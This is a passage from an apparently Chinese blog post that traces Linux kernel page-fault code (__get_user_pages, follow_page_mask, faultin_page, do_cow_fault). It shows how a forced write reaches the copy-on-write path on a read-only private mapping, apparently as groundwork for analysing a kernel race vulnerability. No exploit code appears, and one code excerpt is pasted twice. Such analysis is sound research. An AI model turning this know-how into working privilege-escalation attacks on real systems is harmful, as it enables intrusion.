class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * @gup_flags:就是上面的flags,0x17</span><br><span class="hljs-comment"> * @nonblocking:为之前传递的locked,此时为0</span><br><span class="hljs-comment">*/</span><br><span class="hljs-number">453</span> <span class="hljs-type">long</span> __get_user_pages(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">454</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-number">455</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gup_flags, <span class="hljs-keyword">struct</span> page **pages,<br><span class="hljs-number">456</span>         <span class="hljs-keyword">struct</span> vm_area_struct **vmas, <span class="hljs-type">int</span> *nonblocking)<br><span class="hljs-number">457</span> &#123;<br><span class="hljs-number">458</span>     <span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-number">459</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_mask;<br><span class="hljs-number">460</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">461</span> <br><span class="hljs-number">462</span>     <span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-number">463</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">464</span> <br><span class="hljs-number">465</span>     VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));<br><span class="hljs-number">466</span> <br><span class="hljs-number">467</span>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">468      * If FOLL_FORCE is set then do not force a full fault as the hinting</span><br><span class="hljs-comment">469      * fault information is unrelated to the reference behaviour of a task</span><br><span class="hljs-comment">470      * using the address space</span><br><span class="hljs-comment">  * 如果设置了 FOLL_FORCE，则不要强制发生完整故障，因为提示故障信息与使用地址空间的任务的引用行为无关</span><br><span class="hljs-comment">471      */</span><br><span class="hljs-number">472</span>     <span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br><span class="hljs-number">473</span>         gup_flags |= FOLL_NUMA;<br><span class="hljs-number">474</span> <br><span class="hljs-number">475</span>     <span class="hljs-keyword">do</span> &#123;<br>...<br><span class="hljs-number">494</span>             <span class="hljs-keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))<br><span class="hljs-number">495</span>                 <span class="hljs-keyword">return</span> i ? : -EFAULT;<br><span class="hljs-number">496</span>             <span class="hljs-keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;<br><span class="hljs-number">497</span>                 i = follow_hugetlb_page(mm, vma, pages, vmas,<br><span class="hljs-number">498</span>                         &amp;start, &amp;nr_pages, i,<br><span class="hljs-number">499</span>                         gup_flags);<br><span class="hljs-number">500</span>                 <span class="hljs-keyword">continue</span>;<br><span class="hljs-number">501</span>             &#125;<br><span class="hljs-number">502</span>         &#125;<br><span class="hljs-number">503</span> retry:<br><span class="hljs-number">504</span>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">505          * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment">506          * potentially allocating memory.</span><br><span class="hljs-comment">507          */</span><br><span class="hljs-number">508</span>         <span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-number">509</span>             <span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br><span class="hljs-number">510</span>         cond_resched();<br><span class="hljs-number">511</span>         page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br><span class="hljs-number">512</span>         <span class="hljs-keyword">if</span> (!page) &#123;<br><span class="hljs-number">513</span>             <span class="hljs-type">int</span> ret;<br><span class="hljs-number">514</span>             ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br><span class="hljs-number">515</span>                     nonblocking);<br><span class="hljs-number">516</span>             <span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-number">517</span>             <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-number">518</span>                 <span class="hljs-keyword">goto</span> retry;<br><span class="hljs-number">519</span>             <span class="hljs-keyword">case</span> -EFAULT:                                                                        <br><span class="hljs-number">520</span>             <span class="hljs-keyword">case</span> -ENOMEM:<br><span class="hljs-number">521</span>             <span class="hljs-keyword">case</span> -EHWPOISON:<br><span class="hljs-number">522</span>                 <span class="hljs-keyword">return</span> i ? i : ret;<br><span class="hljs-number">523</span>             <span class="hljs-keyword">case</span> -EBUSY:<br><span class="hljs-number">524</span>                 <span class="hljs-keyword">return</span> i;<br><span class="hljs-number">525</span>             <span class="hljs-keyword">case</span> -ENOENT:<br><span class="hljs-number">526</span>                 <span class="hljs-keyword">goto</span> next_page;<br><span class="hljs-number">527</span>             &#125;<br><span class="hljs-number">528</span>             BUG();<br><span class="hljs-number">529</span>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br><span class="hljs-number">530</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">531              * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment">532              * struct page.</span><br><span class="hljs-comment">533              */</span><br><span class="hljs-number">534</span>             <span class="hljs-keyword">goto</span> next_page;<br><span class="hljs-number">535</span>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br><span class="hljs-number">536</span>             <span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br><span class="hljs-number">537</span>         &#125;<br><span class="hljs-number">538</span>         <span class="hljs-keyword">if</span> (pages) &#123;<br><span class="hljs-number">539</span>             pages[i] = page;<br><span class="hljs-number">540</span>             flush_anon_page(vma, page, start);<br><span class="hljs-number">541</span>             flush_dcache_page(page);<br><span class="hljs-number">542</span>             page_mask = <span class="hljs-number">0</span>;<br><span class="hljs-number">543</span>         &#125;<br><span class="hljs-number">544</span> next_page:<br><span class="hljs-number">545</span>         <span class="hljs-keyword">if</span> (vmas) &#123;<br><span class="hljs-number">546</span>             vmas[i] = vma;<br><span class="hljs-number">547</span>             page_mask = <span class="hljs-number">0</span>;<br><span class="hljs-number">548</span>         &#125;<br><span class="hljs-number">549</span>         page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br><span class="hljs-number">550</span>         <span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br><span class="hljs-number">551</span>             page_increm = nr_pages;<br><span class="hljs-number">552</span>         i += page_increm;<br><span class="hljs-number">553</span>         start += page_increm * PAGE_SIZE;<br><span class="hljs-number">554</span>         nr_pages -= page_increm;<br><span class="hljs-number">555</span>     &#125; <span class="hljs-keyword">while</span> (nr_pages);<br><span class="hljs-number">556</span>     <span class="hljs-keyword">return</span> i;<br><span class="hljs-number">557</span> &#125;<br><br></code></pre></td></tr></table></figure><p>该函数前面的部分体现了为什么要加上 <code>FOLL_FORCE</code>这个参数，当我们执行到一个检测函数 <code>check_vma_flags</code>的时候，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">359</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">check_vma_flags</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> gup_flags)</span><br>360 &#123;<br><span class="hljs-number">361</span>     <span class="hljs-type">vm_flags_t</span> vm_flags = vma-&gt;vm_flags;<br><span class="hljs-number">362</span> <br><span class="hljs-number">363</span>     <span class="hljs-keyword">if</span> (vm_flags &amp; (VM_IO | VM_PFNMAP))<br><span class="hljs-number">364</span>         <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">365</span> <br><span class="hljs-number">366</span>     <span class="hljs-keyword">if</span> (gup_flags &amp; FOLL_WRITE) &#123;<br><span class="hljs-number">367</span>         <span class="hljs-keyword">if</span> (!(vm_flags &amp; VM_WRITE)) &#123;<br><span class="hljs-number">368</span>             <span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br><span class="hljs-number">369</span>                 <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">370</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">371              * We used to let the write,force case do COW in a</span><br><span class="hljs-comment">372              * VM_MAYWRITE VM_SHARED !VM_WRITE vma, so ptrace could</span><br><span class="hljs-comment">373              * set a breakpoint in a read-only mapping of an</span><br><span class="hljs-comment">374              * executable, without corrupting the file (yet only</span><br><span class="hljs-comment">375              * when that file had been opened for writing!).</span><br><span class="hljs-comment">376              * Anon pages in shared mappings are surprising: now</span><br><span class="hljs-comment">377              * just reject it.</span><br><span class="hljs-comment">378              */</span><br><span class="hljs-number">379</span>             <span class="hljs-keyword">if</span> (!is_cow_mapping(vm_flags)) &#123;<br><span class="hljs-number">380</span>                 WARN_ON_ONCE(vm_flags &amp; VM_MAYWRITE);<br><span class="hljs-number">381</span>                 <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">382</span>             &#125;<br>...<br><span class="hljs-number">394</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">395</span> &#125;<br><br></code></pre></td></tr></table></figure><p>这里可以看到如果我们设置force参数，这样这里就不会报错</p><p>这里接着讲回到 <code>__get_user_pages</code>的retry部分，首先是通过<code>follow_page_mask</code>函数来获取对应用户虚拟地址所映射到的物理地址</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7bec1812dbd4692eb9389b506b3f.jpg"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">164</span> <span class="hljs-comment">/**</span><br><span class="hljs-comment">165  * follow_page_mask - look up a page descriptor from a user-virtual address</span><br><span class="hljs-comment">166  * @vma: vm_area_struct mapping @address</span><br><span class="hljs-comment">167  * @address: virtual address to look up</span><br><span class="hljs-comment">168  * @flags: flags modifying lookup behaviour</span><br><span class="hljs-comment">169  * @page_mask: on output, *page_mask is set according to the size of the page</span><br><span class="hljs-comment">170  *</span><br><span class="hljs-comment">171  * @flags can have FOLL_ flags set, defined in &lt;linux/mm.h&gt;</span><br><span class="hljs-comment">172  *</span><br><span class="hljs-comment">173  * Returns the mapped (struct page *), %NULL if no mapping exists, or                                                                                                                   </span><br><span class="hljs-comment">174  * an error pointer if there is a mapping to something not represented</span><br><span class="hljs-comment">175  * by a page descriptor (see also vm_normal_page()).</span><br><span class="hljs-comment">176  */</span><br><span class="hljs-number">177</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,                                         </span><br><span class="hljs-params"><span class="hljs-number">178</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params"><span class="hljs-number">179</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>180 &#123;<br><span class="hljs-number">181</span>     <span class="hljs-type">pgd_t</span> *pgd;<br><span class="hljs-number">182</span>     <span class="hljs-type">pud_t</span> *pud;<br><span class="hljs-number">183</span>     <span class="hljs-type">pmd_t</span> *pmd;<br><span class="hljs-number">184</span>     <span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-number">185</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-number">186</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-number">177</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,                                                                                                                               </span><br><span class="hljs-params"><span class="hljs-number">178</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params"><span class="hljs-number">179</span>                   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>180 &#123;<br><span class="hljs-number">181</span>     <span class="hljs-type">pgd_t</span> *pgd;<br><span class="hljs-number">182</span>     <span class="hljs-type">pud_t</span> *pud;<br><span class="hljs-number">183</span>     <span class="hljs-type">pmd_t</span> *pmd;<br><span class="hljs-number">184</span>     <span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-number">185</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-number">186</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-number">221</span>     <span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pmd_protnone(*pmd))<br><span class="hljs-number">222</span>         <span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-number">223</span>     <span class="hljs-keyword">if</span> (pmd_trans_huge(*pmd)) &#123;                                                                             .....                                                                                    <br><br><span class="hljs-number">243</span>     <span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br><span class="hljs-number">244</span> &#125;<br></code></pre></td></tr></table></figure><p>可以通过注释快速了解函数的作用，最后是调用 <code>follow_page_pte</code>来从页表项当中获取虚拟地址映射到的物理地址，首先我们可以知道我们第一次访问mmap所建立的物理映射的时候，他并没有体现在页表当中，而是会触发我们的PAGE FAULT处理函数，然后才是真正建立了页表的映射，所以该函数 <code>follow_page_mask</code>也必定会返回NULL值，我们同样可以通过调试来确定这一点</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0e2442a7d933c8956746434e971373f0820200cf.jpg"></p><p>接下来查看 <code>follow_page_pte</code>函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">61</span> <span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"> <span class="hljs-number">62</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br> 63 &#123;<br> <span class="hljs-number">64</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br> <span class="hljs-number">65</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br> <span class="hljs-number">66</span>     <span class="hljs-type">spinlock_t</span> *ptl;<br> <span class="hljs-number">67</span>     <span class="hljs-type">pte_t</span> *ptep, pte;<br> <span class="hljs-number">68</span> <br> <span class="hljs-number">69</span> retry:<br> <span class="hljs-number">70</span>     <span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd)))                                                        <br> <span class="hljs-number">71</span>         <span class="hljs-keyword">return</span> no_page_table(vma, flags);<br> <span class="hljs-number">72</span> <br> <span class="hljs-number">73</span>     ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br> <span class="hljs-number">74</span>     pte = *ptep;<br> .....<br> <span class="hljs-number">95</span>     <span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<br> <span class="hljs-number">96</span>         pte_unmap_unlock(ptep, ptl);<br> <span class="hljs-number">97</span>         <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br> <span class="hljs-number">98</span>     &#125;<br> <span class="hljs-number">99</span> <br><br></code></pre></td></tr></table></figure><p>由于我们mmap映射到的用户虚拟地址是第一次访问，因此还并没有在页表上面建立映射，所以这里得到的pte(page_table_entry)也必定为0</p><p>得知返回值为0我们继续分析 <code>__get_user_pages</code> 的retry</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-number">503</span> retry:<br> <span class="hljs-number">504</span>         <span class="hljs-comment">/*</span><br><span class="hljs-comment"> 505          * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment"> 506          * potentially allocating memory.</span><br><span class="hljs-comment"> 507          */</span><br> <span class="hljs-number">508</span>         <span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br> <span class="hljs-number">509</span>             <span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br> <span class="hljs-number">510</span>         cond_resched();<br> <span class="hljs-number">511</span>         page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br> <span class="hljs-number">512</span>         <span class="hljs-keyword">if</span> (!page) &#123;<br> <span class="hljs-number">513</span>             <span class="hljs-type">int</span> ret;<br> <span class="hljs-number">514</span>             ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br> <span class="hljs-number">515</span>                     nonblocking);<br>.......<br></code></pre></td></tr></table></figure><p>若page为0,则会调用 <code>faultin_page</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">290</span> <span class="hljs-comment">/*</span><br><span class="hljs-comment">291  * mmap_sem must be held on entry.  If @nonblocking != NULL and</span><br><span class="hljs-comment">292  * *@flags does not include FOLL_NOWAIT, the mmap_sem may be released.</span><br><span class="hljs-comment">293  * If it is, *@nonblocking will be set to 0 and -EBUSY returned.</span><br><span class="hljs-comment">294  */</span>     <br><span class="hljs-number">295</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-number">296</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>297 &#123;<br><span class="hljs-number">298</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-number">299</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br><span class="hljs-number">300</span>     <span class="hljs-type">int</span> ret;<br> ......<br><span class="hljs-number">310</span>     <span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE)<br><span class="hljs-number">311</span>         fault_flags |= FAULT_FLAG_WRITE;<br> ......<br><span class="hljs-number">320</span> <br><span class="hljs-number">321</span>     ret = handle_mm_fault(mm, vma, address, fault_flags);<br> ......<br><br></code></pre></td></tr></table></figure><p>看到这里的faultin_page函数由于你传入的标识为有 <code>FOLL_WRITE</code>，因此他给 <code>fault_flags</code>加上了 <code>FAULT_FLAG_WRITE</code>标识位，也就是说 <code>fault_flags=1</code></p><p>然后调用<code>handle_mm_fault-&gt;__handle_mm_fault-&gt;handle_pte_fault</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">3272</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-number">3273</span>              <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,</span><br><span class="hljs-params"><span class="hljs-number">3274</span>              <span class="hljs-type">pte_t</span> *pte, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>3275 &#123;<br> .......<br><span class="hljs-number">3287</span>     entry = *pte;<br><span class="hljs-number">3288</span>     barrier();<br><span class="hljs-number">3289</span>     <span class="hljs-keyword">if</span> (!pte_present(entry)) &#123;<br><span class="hljs-number">3290</span>         <span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<br><span class="hljs-number">3291</span>             <span class="hljs-keyword">if</span> (vma_is_anonymous(vma))<br><span class="hljs-number">3292</span>                 <span class="hljs-keyword">return</span> do_anonymous_page(mm, vma, address,<br><span class="hljs-number">3293</span>                              pte, pmd, flags);<br><span class="hljs-number">3294</span>             <span class="hljs-keyword">else</span><br><span class="hljs-number">3295</span>                 <span class="hljs-keyword">return</span> do_fault(mm, vma, address, pte, pmd,<br><span class="hljs-number">3296</span>                         flags, entry);<br><span class="hljs-number">3297</span>         &#125;<br>.......<br></code></pre></td></tr></table></figure><p>由于这是我们第一次处理缺页异常，因此这里获取到的pte是空，因此会进入下面的判断，而由于我们在创建mmap映射的时候，传递的flag参数为 <code>PROT_READ|MAP_PRIVATE</code>,所以这里并不会调用 <code>do_anonymouse_page</code>，因此会紧接着调用 <code>do_fault</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">3108</span> <span class="hljs-comment">/*</span><br><span class="hljs-comment">3109  * We enter with non-exclusive mmap_sem (to exclude vma changes,</span><br><span class="hljs-comment">3110  * but allow concurrent faults).</span><br><span class="hljs-comment">3111  * The mmap_sem may have been released depending on flags and our</span><br><span class="hljs-comment">3112  * return value.  See filemap_fault() and __lock_page_or_retry().</span><br><span class="hljs-comment">3113  */</span> <br><span class="hljs-number">3114</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-number">3115</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pte_t</span> *page_table, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params"><span class="hljs-number">3116</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">pte_t</span> orig_pte)</span><br>3117 &#123;<br><span class="hljs-number">3118</span>     <span class="hljs-type">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)<br><span class="hljs-number">3119</span>             - vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;<br><span class="hljs-number">3120</span> <br><span class="hljs-number">3121</span>     pte_unmap(page_table);<br><span class="hljs-number">3122</span>     <span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br><span class="hljs-number">3123</span>     <span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<br><span class="hljs-number">3124</span>         <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br><span class="hljs-number">3125</span>     <span class="hljs-keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))<br><span class="hljs-number">3126</span>         <span class="hljs-keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,<br><span class="hljs-number">3127</span>                 orig_pte);<br><span class="hljs-number">3128</span>     <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<br><span class="hljs-number">3129</span>         <span class="hljs-keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,<br><span class="hljs-number">3130</span>                 orig_pte);<br><span class="hljs-number">3131</span>     <span class="hljs-keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);<br><span class="hljs-number">3132</span> &#125;<br></code></pre></td></tr></table></figure><p>这里可以看到，由于我们flags仅仅为 <code>FAULT_FLAG+WRITE</code>,并且我们的vmflags没有 <code>VM_SHARED</code>（这是因为我们创建映射的时候是MAP_PRIVATE，也就是私有映射），所以会调用 <code>do_cow_fault</code></p><p>而 <code>do_cow_fault</code>的功能首先获取一个新的页面 new_page,然后调用 <code>__do_fault</code>函数来将page cache中关于文件的映射部分复制到fault_page当中(获取fault_page体现在 <code>find_get_page</code>函数当中，他会返回我们的page cache page,这里会增加引用计数的，所以不要担心释放的问题 )，然后调用函数 <code>copy_user_highpage</code> 将fault_page的内容复制到new_page当中，最后释放fault_page，然后就开始与虚拟地址在页表当中建立映射，调用 <code>do_set_pte</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">2810</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_set_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,                      </span><br><span class="hljs-params"><span class="hljs-number">2811</span>         <span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">pte_t</span> *pte, <span class="hljs-type">bool</span> write, <span class="hljs-type">bool</span> anon)</span><br>2812 &#123;<br><span class="hljs-number">2813</span>     <span class="hljs-type">pte_t</span> entry;<br><span class="hljs-number">2814</span> <br><span class="hljs-number">2815</span>     flush_icache_page(vma, 